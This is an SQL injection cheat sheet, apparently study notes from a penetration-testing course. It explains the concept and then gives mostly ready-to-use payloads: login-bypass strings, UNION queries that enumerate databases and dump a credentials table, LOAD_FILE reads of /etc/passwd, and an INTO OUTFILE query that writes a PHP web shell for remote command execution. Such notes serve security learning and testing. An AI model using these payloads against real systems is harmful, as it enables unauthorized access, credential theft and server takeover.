# SQL Injection (SQLi) Fundamentals
**Concept:** SQL Injection occurs when untrusted user input is concatenated directly into a database query without validation. This allows an attacker to manipulate the query structure, bypass authentication, retrieve unauthorized data, or execute system commands. 
**Impact:** Data exfiltration, Authentication Bypass, Remote Code Execution (RCE).
## 1. Authentication Bypass
**Goal:** Log in as an administrator without knowing the password by manipulating the logic of the login query.
### The Logic
Typical Login Query:
```sql
SELECT * FROM logins WHERE username='$user' AND password='$pass';
```
If we inject `' OR '1'='1`, the query becomes always true, regardless of the password.
### Operational Payloads
| **Type**                 | **Payload**              | **Resulting Query Logic**                                 |
| -------------------- | -------------------- | ----------------------------------------------------- |
| *Basic OR*           | `admin' OR '1'='1`   | `WHERE username='admin' OR '1'='1' AND...` (True)     |
| *Comment Truncation* | `admin' -- -`        | `WHERE username='admin' -- (Rest ignored)`            |
| *Hybrid*             | `admin' OR 1=1 -- -` | `WHERE username='admin' OR 1=1 (True + Rest ignored)` |
**Note on Comments:**
- MySQL: `#` or `--` (dash-dash-space)
- PostgreSQL/MSSQL: `--`
## 2. Union-Based Injection (Data Extraction)
**Goal:** Retrieve data from other tables by combining results using the `UNION` operator. 
**Constraint:** The injected `SELECT` statement must have the **same number of columns** as the original query and compatible data types.
### Step 1: Determine Column Count (`ORDER BY`)
Inject `ORDER BY` clauses until the application throws an error.
```sql
' ORDER BY 1-- -   # No Error
' ORDER BY 2-- -   # No Error
' ORDER BY 3-- -   # No Error
' ORDER BY 4-- -   # Error! (Table has 3 columns)
```
### Step 2: Identify Display Columns (`UNION SELECT`)
Find which columns are displayed on the page so we can use them to dump data.
```sql
cn' UNION SELECT 1, 2, 3-- -
```
_If the number "2" appears on the webpage, column 2 is injectable._
### Step 3: Database Enumeration
Extract metadata to understand the environment.
```sql
# Get Version, Database Name, and Current User
cn' UNION SELECT 1, @@version, database(), user()-- -
```
### Step 4: Schema Enumeration (The Map)
Navigate the `information_schema` to find tables and columns.

**1. Find Databases:**
```sql
cn' UNION SELECT 1, schema_name, 3, 4 FROM information_schema.schemata-- -
```

**2. Find Tables (e.g., in 'dev' database):**
```sql
cn' UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4 FROM information_schema.tables WHERE table_schema='dev'-- -
```

**3. Find Columns (e.g., in 'credentials' table):**
```sql
cn' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM information_schema.columns WHERE table_name='credentials'-- -
```

**4. Dump Data:**
```sql
cn' UNION SELECT 1, username, password, 4 FROM dev.credentials-- -
```
## 3. Privilege Escalation & File I/O
**Goal:** Read sensitive system files or write a web shell to gain RCE. 
**Requirement:** The DB user needs `FILE` privileges, and `secure_file_priv` must be empty.
### Checking Privileges
```sql
# Check for 'secure_file_priv' (Must be empty for arbitrary write)
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -

# Check User Privileges
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
### Reading Files (`LOAD_FILE`)
Useful for grabbing config files, SSH keys, or source code.
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("c:/windows/win.ini"), 3, 4-- -
```
### Writing Files (`INTO OUTFILE`)
**Goal:** Write a PHP shell into the web root to gain Remote Code Execution.

**Syntax:**
```sql
<Query> INTO OUTFILE '<Path>'
```

**Exploit Example (Web Shell):**
```sql
cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```
- **Constraint:** You must know the absolute path of the web root (e.g., `/var/www/html/`) and the MySQL user must have write permissions on that directory.

**Execution:** Navigate to `http://target.com/shell.php?0=id` to execute commands.